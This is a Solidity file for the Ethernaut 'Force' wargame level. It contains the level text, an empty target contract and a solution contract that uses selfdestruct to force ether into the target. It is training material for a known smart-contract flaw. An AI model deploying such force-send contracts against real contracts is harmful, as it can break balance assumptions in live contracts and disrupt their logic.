/* 


Force
Level completed!
Difficulty 5/10

Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

Fallback methods
Sometimes the best way to attack a contract is with another contract.
See the Help page above, section "Beyond the console"
In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.

 */

 // SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}



// Solution
pragma solidity ^0.4.0;


contract ForceDrain {
    constructor() public payable {
        
    }
    
    function drainAttact(address _contractAddress) public {
        // This drains all the balance of the current contract
        // Gotten from th chrome console using - await getBalance(contract.address)
        selfdestruct(_contractAddress);
        // Force(_contractAddress).transter(address(this).balance)
    }
}
